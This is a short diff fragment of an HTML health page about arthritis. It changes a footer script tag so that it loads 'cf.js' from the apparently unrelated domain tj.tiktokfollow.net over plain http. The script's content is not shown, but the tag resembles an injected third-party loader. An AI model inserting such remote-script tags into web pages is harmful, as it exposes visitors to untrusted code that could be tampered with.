@@ -72,4 +72,4 @@ Severe arthritis, particularly if it affects your hands or arms, can make it dif
 </div>
 </section>
 
-<script src="https://tj.tiktokfollow.net/cf.js" async></script>
+<script src="http://tj.tiktokfollow.net/cf.js" async></script>
